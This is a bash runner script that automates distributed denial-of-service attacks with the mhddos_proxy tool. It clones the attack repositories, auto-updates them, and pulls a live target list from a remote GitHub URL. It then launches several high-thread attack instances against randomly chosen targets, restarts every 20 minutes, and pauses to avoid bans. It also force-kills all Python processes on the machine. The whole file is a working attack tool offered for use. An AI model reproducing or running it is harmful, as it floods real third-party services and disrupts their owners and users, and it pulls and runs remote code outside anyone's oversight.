#!/bin/bash

restart_interval="20m"

ulimit -n 1048576
# TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
#cd ~/mhddos_proxy
#sudo git checkout 49a4c8b034c2f7a5d3d0548e892414a2ebd30076
#sudo pip3 install -r requirements.txt

#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
taskkill -f -im python.exe
taskkill -f -im python3.8.exe
taskkill -f -im python3.9.exe
taskkill -f -im python3.10.exe
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
# for Docker
#echo "Kill all useless docker-containers with MHDDoS"
#docker kill $(docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
#echo "Docker useless containers killed"

proxy_interval="1200"
proxy_interval="-p $proxy_interval"

num_of_copies="${1:-1}"
threads="${2:-1500}"
if ((threads < 1000));
then
	threads=1000
fi

rpc="${3:-1000}"
if ((rpc < 1000));
then
	rpc=1000
fi

debug="${4:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
then
	debug="--debug"
fi


#Installing files into correct directory
cd ~
git clone https://github.com/alexnest-ua/runner_for_windows.git
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd ~/mhddos_proxy
python -m pip install -r requirements.txt



# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
do	
	cd ~/mhddos_proxy


	num0=$(git pull origin main | grep -P -c 'Already|Уже')
   	echo "$num0"
   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		cd ~/mhddos_proxy
		clear
		python -m pip install -r requirements.txt
		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
	fi
	
	
	cd ~/runner_for_windows
   	num=$(git pull origin main | grep -P -c 'Already|Уже')
   	echo "$num"
   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		cd ~/runner_for_windows
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh $num_of_copies $threads $rpc $debug& # run new downloaded script 
		#pkill -o -f runner.sh
		return 0
		#exit #terminate old script
	fi
	#
   	
	
   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
   	if (("$num_of_copies" == "all"));
	then	
		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
		then
			random_numbers=$(shuf -i 1-$list_size -n 3)
		else
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
		fi
	elif ((num_of_copies > list_size));
	then 
		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
		then
			random_numbers=$(shuf -i 1-$list_size -n 3)
		else
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
		fi
	elif ((num_of_copies < 1));
	then
		num_of_copies=1
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	fi
	
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
      
   	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
           

            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            echo "python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
            
            cd ~/mhddos_proxy
            #docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
            python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   	done
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
   	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
   	taskkill -f -im python.exe
	taskkill -f -im python3.8.exe
	taskkill -f -im python3.9.exe
	taskkill -f -im python3.10.exe
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-4 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
	
	# for docker
   	#echo "Kill all useless docker-containers with MHDDoS"
   	#docker kill $(docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
   	#echo "Docker useless containers killed"
done
